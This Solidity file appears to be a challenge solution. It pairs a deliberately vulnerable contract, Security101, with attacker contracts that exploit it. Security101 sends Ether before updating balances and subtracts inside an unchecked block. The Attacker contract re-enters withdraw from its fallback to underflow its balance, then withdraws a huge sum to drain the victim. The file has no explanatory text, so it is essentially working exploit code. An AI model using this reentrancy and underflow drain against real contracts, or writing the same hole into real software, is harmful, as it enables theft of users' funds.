// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.15;

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

// Security101(msg.sender).withdraw(10000);
// use uint 0
//use uint 1
contract OptimizedAttackerSecurity101 {
    constructor(Security101 _victim) payable {
        new Attacker().attack{value: msg.value}(_victim);
    }
}

contract Attacker {
    function attack(Security101 _victim) external payable {
        _victim.deposit{value: msg.value}();
        _victim.withdraw(msg.value);
        _victim.withdraw(9999000000000000000000);
    }
    fallback() external payable {
        if (msg.value == 1000000000000000000) {
                Security101(msg.sender).deposit{value: msg.value}();
                Security101(msg.sender).withdraw(msg.value << 1);
        } 
    }
}
